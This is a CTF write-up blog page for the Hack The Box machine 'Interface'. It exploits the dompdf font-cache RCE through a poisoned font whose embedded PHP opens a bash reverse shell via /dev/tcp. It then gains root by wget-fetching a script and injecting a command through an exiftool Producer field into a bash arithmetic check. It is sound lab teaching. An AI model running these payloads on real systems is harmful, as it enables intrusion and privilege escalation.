<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box - Interface [Medium] | 0x73796C31</title><meta name=keywords content="hackthebox"><meta name=description content="The most important in this machine would be the enumeration, it exploits vulnerabilities like:
CVE-2022-28368 Executing files with sudo privileges Recon I started with just the website interface.htb where there isn&rsquo;t much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.
HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Tue, 14 Feb 2023 08:44:41 GMT Content-Type: text/html; charset=utf-8 Connection: close Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www."><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/writeups/htb-interface/><link crossorigin=anonymous href=/assets/css/stylesheet.f8c2ee4fde28779dff9afcd3046f6bd6fc9cbeb1ddf60d48a81b676d7162c1bb.css integrity="sha256-+MLuT94od53/mvzTBG9r1vycvrHd9g1IqBtnbXFiwbs=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Hack The Box - Interface [Medium]"><meta property="og:description" content="The most important in this machine would be the enumeration, it exploits vulnerabilities like:
CVE-2022-28368 Executing files with sudo privileges Recon I started with just the website interface.htb where there isn&rsquo;t much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.
HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Tue, 14 Feb 2023 08:44:41 GMT Content-Type: text/html; charset=utf-8 Connection: close Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www."><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/writeups/htb-interface/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-06-08T02:01:27+03:00"><meta property="article:modified_time" content="2023-06-08T02:01:27+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box - Interface [Medium]"><meta name=twitter:description content="The most important in this machine would be the enumeration, it exploits vulnerabilities like:
CVE-2022-28368 Executing files with sudo privileges Recon I started with just the website interface.htb where there isn&rsquo;t much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.
HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Tue, 14 Feb 2023 08:44:41 GMT Content-Type: text/html; charset=utf-8 Connection: close Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Writeups","item":"https://sy1.sh/writeups/"},{"@type":"ListItem","position":3,"name":"Hack The Box - Interface [Medium]","item":"https://sy1.sh/writeups/htb-interface/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Interface [Medium]","name":"Hack The Box - Interface [Medium]","description":"The most important in this machine would be the enumeration, it exploits vulnerabilities like:\nCVE-2022-28368 Executing files with sudo privileges Recon I started with just the website interface.htb where there isn\u0026rsquo;t much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.\nHTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Tue, 14 Feb 2023 08:44:41 GMT Content-Type: text/html; charset=utf-8 Connection: close Content-Security-Policy: script-src \u0026#39;unsafe-inline\u0026#39; \u0026#39;unsafe-eval\u0026#39; \u0026#39;self\u0026#39; data: https://www.","keywords":["hackthebox"],"articleBody":"The most important in this machine would be the enumeration, it exploits vulnerabilities like:\nCVE-2022-28368 Executing files with sudo privileges Recon I started with just the website interface.htb where there isn’t much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.\nHTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Tue, 14 Feb 2023 08:44:41 GMT Content-Type: text/html; charset=utf-8 Connection: close Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:; X-Powered-By: Next.js ETag: \"i8ubiadkff4wf\" Vary: Accept-Encoding Content-Length: 6359 I saw the CSP header which has a bunch of websites in, and frankly I didn’t spot the subdomain at first, but that was the next pivoting point http://prd.m.rendering-api.interface.htb.\nGoing to the subdomain, you are greeted by a single File not Found text with a 404 status. Here comes the tricky part, the usual reconning using ffuf,feroxbuster and such, are ignoring the 404 status over the things it finds, and it’s tricky to set something that is working for this particular case.\n$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u http://prd.m.rendering-api.interface.htb/FUZZ -mc all -fs 0 I found several endpoints that are returning more than just 404.\napi/experiments/configurations [Status: 404, Size: 50, Words: 3, Lines: 1... api/experiments [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: api [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: vendor [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: Using curl, I found some API responses over those endpoints.\n$ curl -i http://prd.m.rendering-api.interface.htb/api/ HTTP/1.1 404 Not Found Server: nginx/1.14.0 (Ubuntu) Date: Tue, 14 Feb 2023 08:53:49 GMT Content-Type: application/json Transfer-Encoding: chunked Connection: keep-alive {\"status\":\"404\",\"status_text\":\"route not defined\"} Then I began enumerating the API, by filtering the 404 using a GET request.\nThe tricky thing is that you must try to use all the methods GET,POST,PUT,DELETE on everything. That could have been easier with feroxbuster but the thing is that on the feroxbuster tool there isn’t an -mc all option which matches all the response codes and I had to do it manually with ffuf.\nThis is what I’ve used to find another pivot point.\n$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/big.txt -u http://prd.m.rendering-api.interface.htb/api/FUZZ -mc all -fs 50 -X POST ... html2pdf [Status: 422, Size: 36, Words: 2, Lines: 1... I found other stuff like composer,dumpdf before that and I started to search some exploits for dumpdf since I thought that would be the next pivot point and found this PoC of an exploit: https://github.com/positive-security/dompdf-rce.\nThe next thing to figure out was how to pass the file to that endpoint. While I tried to just send the file without any parameters, it returns missing parameters so I had to explore the dompdf implementations. The parameters that dompdf uses are just two.\n$dompdf-\u003eloadHtml($html); $dompdf-\u003esetPaper('A4', 'landscape'); $dompdf-\u003erender(); I know that this is an API, so it must accept some JSON, so I crafted some random payload which I admit I got really lucky.\n{ \"html\": \"test\", \"paper\": \"A4\" } Because the response was 200 OK and a binary with the attached PDF.\nExploiting the dumpdf RCE The dumpdf is apparently caching the fonts that it processes during the conversion of HTML to PDF. It stores them under /vendor/dompdf/dompdf/lib/fonts/ folder. Earlier in my discovery I enumerated another possible pivoting point that however gave 403, which was /vendor/dompdf/dompdf so following the PoC I’ve crafted the following payload.\nPOST /api/html2pdf HTTP/1.1 Host: prd.m.rendering-api.interface.htb Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Content-Type: application/json Connection: close Content-Length: 47 { \"html\": \"\", \"paper\": \"A4\" } # syl.css @font-face { font-family:'syl'; src:url('http://10.10.14.73:8000/syl.php'); font-weight:'normal'; font-style:'normal'; } # syl.php, this is a legit font just with 1 line PHP on the bottom \u003c?php exec(\"/bin/bash -c 'bash -i \u003e /dev/tcp/10.10.14.73/4444 0\u003e\u00261'\"); ?\u003e After that I execute the request, the server would try to get the CSS and the font from my server, and it would cache the font into the specified folder and after executing the request. I saw that it does exactly that:\n# My Server logs 10.129.20.249 - - [14/Feb/2023 11:20:07] \"GET /syl.css HTTP/1.0\" 200 - 10.129.20.249 - - [14/Feb/2023 11:20:07] \"GET /syl.php HTTP/1.0\" 200 - That means that we have our ‘font’ already cached on the server under the folder /vendor/dompdf/dompdf/lib/fonts/ however what would be the name, because trying to execute syl.php wasn’t yielding results.\nTo figure that out I thought it might be several things, md5(file), md5(url of the font), some_hashing_algo(file/url of the font) so I had to research how it saves the fonts. Fortunately, the PoC gives us a clue of how is this working. The font file there is named exploitfont_normal_3f83639933428d70e74a061f39009622.php and I brute forced my way out of this by trying syl_normal_ and md5(file), md5(url of the font) and the URL of the font was the right one, so I got a reverse shell with that.\n$ curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/syl_normal_ee17d95350fea4e27875b56170439107.php ... $ nc -lnvp 4444 listening on [any] 4444 ... connect to [10.10.14.73] from (UNKNOWN) [10.129.20.249] 60822 pwd /var/www/api/vendor/dompdf/dompdf/lib/fonts With that and using linpeas.sh I could read the first flag which is located in /home/dev/user.txt.\nGaining Root This was a tricky one, and I got some help with it since I couldn’t find how. I only found a script that was cleaning some cache files with the tag Producer: dompdf in the /tmp folder. The script is located here: /usr/local/sbin/cleancache.sh. I was pretty sure that this is the root pivot point, but I didn’t know how to exploit it.\nI joined some discussions and one of the users mentioned the # Bash’s white collar eval: [[ $var -eq 42 ]] runs arbitrary code too - https://www.vidarholen.net/contents/blog/?p=716\nI didn’t know that you could do that, but after reading the article it was clear what I should do.\n$ cd /tmp $ mkdir syl $ cd syl \u0026\u0026 wget http://10.10.14.73:8000/admin.sh $ chmod +x ./admin.sh $ wget http://10.10.14.73:8000/test.pdf $ exiftool -Producer='a[$(/tmp/syl/admin.sh\u003e\u00262)]+42' test.pdf \u003c -Producer='a[$(/tmp/syl/admin.sh\u003e\u00262)]+42' test.pdf 1 image files updated $ /usr/local/sbin/cleancache.sh /usr/local/sbin/cleancache.sh chmod: changing permissions of '/bin/bash': Operation not permitted chmod: changing permissions of '/bin/bash': Operation not permitted $ /bin/bash -p bash-4.4# cat /root/root.txt ","wordCount":"1028","inLanguage":"en","datePublished":"2023-06-08T02:01:27+03:00","dateModified":"2023-06-08T02:01:27+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/writeups/htb-interface/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>About</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/writeups/>Writeups</a></div><h1 class=post-title>Hack The Box - Interface [Medium]</h1><div class=post-meta><span title='2023-06-08 02:01:27 +0300 +0300'>June 8, 2023</span>&nbsp;·&nbsp;5 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#recon aria-label=Recon>Recon</a></li><li><a href=#exploiting-the-dumpdf-rce aria-label="Exploiting the dumpdf RCE">Exploiting the <code>dumpdf RCE</code></a></li><li><a href=#gaining-root aria-label="Gaining Root">Gaining Root</a></li></ul></div></details></div><div class=post-content><p>The most important in this machine would be the enumeration, it exploits vulnerabilities like:</p><ul><li><a href=https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/>CVE-2022-28368</a></li><li><a href=https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid>Executing files with sudo privileges</a></li></ul><h2 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h2><p>I started with just the website <code>interface.htb</code> where there isn&rsquo;t much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>nginx/1.14.0 (Ubuntu)</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 14 Feb 2023 08:44:41 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Security-Policy</span><span class=o>:</span> <span class=l>script-src &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; &#39;self&#39; data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src &#39;self&#39; http://prd.m.rendering-api.interface.htb; style-src &#39;self&#39; &#39;unsafe-inline&#39; https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;</span>
</span></span><span class=line><span class=cl><span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>Next.js</span>
</span></span><span class=line><span class=cl><span class=n>ETag</span><span class=o>:</span> <span class=l>&#34;i8ubiadkff4wf&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Vary</span><span class=o>:</span> <span class=l>Accept-Encoding</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>6359</span>
</span></span></code></pre></div><p>I saw the CSP header which has a bunch of websites in, and frankly I didn&rsquo;t spot the subdomain at first, but that was the next pivoting point <code>http://prd.m.rendering-api.interface.htb</code>.</p><p>Going to the subdomain, you are greeted by a single <code>File not Found</code> text with a 404 status. Here comes the tricky part, the usual reconning using <code>ffuf,feroxbuster</code> and such, are ignoring the 404 status over the things it finds, and it&rsquo;s tricky to set something that is working for this particular case.</p><pre tabindex=0><code>$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u http://prd.m.rendering-api.interface.htb/FUZZ -mc all -fs 0
</code></pre><p>I found several endpoints that are returning more than just 404.</p><pre tabindex=0><code>api/experiments/configurations [Status: 404, Size: 50, Words: 3, Lines: 1...
api/experiments         [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 
api                     [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 
vendor                  [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 
</code></pre><p>Using <code>curl</code>, I found some API responses over those endpoints.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>$ curl -i http://prd.m.rendering-api.interface.htb/api/                                  
</span></span></span><span class=line><span class=cl><span class=err></span><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>404</span> <span class=ne>Not Found</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>nginx/1.14.0 (Ubuntu)</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 14 Feb 2023 08:53:49 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;status&#34;</span><span class=p>:</span><span class=s2>&#34;404&#34;</span><span class=p>,</span><span class=nt>&#34;status_text&#34;</span><span class=p>:</span><span class=s2>&#34;route not defined&#34;</span><span class=p>}</span>
</span></span></code></pre></div><p>Then I began enumerating the API, by filtering the 404 using a GET request.</p><p>The tricky thing is that you must try to use all the methods <code>GET,POST,PUT,DELETE</code> on everything. That could have been easier with <code>feroxbuster</code> but the thing is that on the <code>feroxbuster</code> tool there isn&rsquo;t an <code>-mc all</code> option which matches all the response codes and I had to do it manually with <code>ffuf</code>.</p><p>This is what I&rsquo;ve used to find another pivot point.</p><pre tabindex=0><code>$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/big.txt -u http://prd.m.rendering-api.interface.htb/api/FUZZ -mc all -fs 50 -X POST
...
html2pdf                [Status: 422, Size: 36, Words: 2, Lines: 1...
</code></pre><p>I found other stuff like <code>composer,dumpdf</code> before that and I started to search some exploits for <code>dumpdf</code> since I thought that would be the next pivot point and found this PoC of an exploit: <a href=https://github.com/positive-security/dompdf-rce>https://github.com/positive-security/dompdf-rce</a>.</p><p>The next thing to figure out was how to pass the file to that endpoint. While I tried to just send the file without any parameters, it returns <code>missing parameters</code> so I had to explore the <code>dompdf</code> implementations. The parameters that <code>dompdf</code> uses are just two.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$dompdf</span><span class=o>-&gt;</span><span class=na>loadHtml</span><span class=p>(</span><span class=nv>$html</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=nv>$dompdf</span><span class=o>-&gt;</span><span class=na>setPaper</span><span class=p>(</span><span class=s1>&#39;A4&#39;</span><span class=p>,</span><span class=nx> </span><span class=s1>&#39;landscape&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$dompdf</span><span class=o>-&gt;</span><span class=na>render</span><span class=p>();</span>
</span></span></code></pre></div><p>I know that this is an API, so it must accept some JSON, so I crafted some random payload which I admit I got really lucky.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;html&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;h1&gt;test&lt;/h1&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;paper&#34;</span><span class=p>:</span> <span class=s2>&#34;A4&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Because the response was <code>200 OK</code> and a binary with the attached PDF.</p><h2 id=exploiting-the-dumpdf-rce>Exploiting the <code>dumpdf RCE</code><a hidden class=anchor aria-hidden=true href=#exploiting-the-dumpdf-rce>#</a></h2><p>The <code>dumpdf</code> is apparently caching the fonts that it processes during the conversion of HTML to PDF. It stores them under <code>/vendor/dompdf/dompdf/lib/fonts/</code> folder. Earlier in my discovery I enumerated another possible pivoting point that however gave 403, which was <code>/vendor/dompdf/dompdf</code> so following the PoC I&rsquo;ve crafted the following payload.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/html2pdf</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>prd.m.rendering-api.interface.htb</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>47</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;html&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;link rel=stylesheet href=&#39;http://10.10.14.73:8000/syl.css&#39;&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;paper&#34;</span><span class=p>:</span> <span class=s2>&#34;A4&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><pre tabindex=0><code># syl.css
@font-face {
    font-family:&#39;syl&#39;;
    src:url(&#39;http://10.10.14.73:8000/syl.php&#39;);
    font-weight:&#39;normal&#39;;
    font-style:&#39;normal&#39;;
}
</code></pre><pre tabindex=0><code># syl.php, this is a legit font just with 1 line PHP on the bottom
&lt;LEGIT FONT BINARY DATA&gt;
&lt;?php exec(&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.10.14.73/4444 0&gt;&amp;1&#39;&#34;); ?&gt;
</code></pre><p>After that I execute the request, the server would try to get the CSS and the font from my server, and it would cache the font into the specified folder and after executing the request. I saw that it does exactly that:</p><pre tabindex=0><code># My Server logs
10.129.20.249 - - [14/Feb/2023 11:20:07] &#34;GET /syl.css HTTP/1.0&#34; 200 -
10.129.20.249 - - [14/Feb/2023 11:20:07] &#34;GET /syl.php HTTP/1.0&#34; 200 -
</code></pre><p>That means that we have our &lsquo;font&rsquo; already cached on the server under the folder <code>/vendor/dompdf/dompdf/lib/fonts/</code> however what would be the name, because trying to execute <code>syl.php</code> wasn&rsquo;t yielding results.</p><p>To figure that out I thought it might be several things, <code>md5(file), md5(url of the font), some_hashing_algo(file/url of the font)</code> so I had to research how it saves the fonts. Fortunately, the PoC gives us a clue of how is this working. The font file there is named <code>exploitfont_normal_3f83639933428d70e74a061f39009622.php</code> and I brute forced my way out of this by trying <code>syl_normal_</code> and <code>md5(file), md5(url of the font)</code> and the URL of the font was the right one, so I got a reverse shell with that.</p><pre tabindex=0><code>$ curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/syl_normal_ee17d95350fea4e27875b56170439107.php
...
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.73] from (UNKNOWN) [10.129.20.249] 60822
pwd
/var/www/api/vendor/dompdf/dompdf/lib/fonts
</code></pre><p>With that and using <code>linpeas.sh</code> I could read the first flag which is located in <code>/home/dev/user.txt</code>.</p><h2 id=gaining-root>Gaining Root<a hidden class=anchor aria-hidden=true href=#gaining-root>#</a></h2><p>This was a tricky one, and I got some help with it since I couldn&rsquo;t find how. I only found a script that was cleaning some cache files with the tag <code>Producer: dompdf</code> in the <code>/tmp</code> folder. The script is located here: <code>/usr/local/sbin/cleancache.sh</code>. I was pretty sure that this is the root pivot point, but I didn&rsquo;t know how to exploit it.</p><p>I joined some discussions and one of the users mentioned the <code># Bash’s white collar eval: [[ $var -eq 42 ]] runs arbitrary code too</code> - <a href="https://www.vidarholen.net/contents/blog/?p=716">https://www.vidarholen.net/contents/blog/?p=716</a></p><p>I didn&rsquo;t know that you could do that, but after reading the article it was clear what I should do.</p><pre tabindex=0><code>$ cd /tmp
$ mkdir syl
$ cd syl &amp;&amp; wget http://10.10.14.73:8000/admin.sh
$ chmod +x ./admin.sh
$ wget http://10.10.14.73:8000/test.pdf
$ exiftool -Producer=&#39;a[$(/tmp/syl/admin.sh&gt;&amp;2)]+42&#39; test.pdf
&lt; -Producer=&#39;a[$(/tmp/syl/admin.sh&gt;&amp;2)]+42&#39; test.pdf
    1 image files updated
$ /usr/local/sbin/cleancache.sh
/usr/local/sbin/cleancache.sh
chmod: changing permissions of &#39;/bin/bash&#39;: Operation not permitted
chmod: changing permissions of &#39;/bin/bash&#39;: Operation not permitted
$ /bin/bash -p
bash-4.4# cat /root/root.txt
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://sy1.sh/tags/hackthebox/>hackthebox</a></li></ul><nav class=paginav><a class=prev href=https://sy1.sh/writeups/htb-escape/><span class=title>« Prev</span><br><span>Hack The Box - Escape [Medium]</span></a>
<a class=next href=https://sy1.sh/writeups/htb-precious/><span class=title>Next »</span><br><span>Hack The Box - Precious [Easy]</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod (sy1 modified)</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>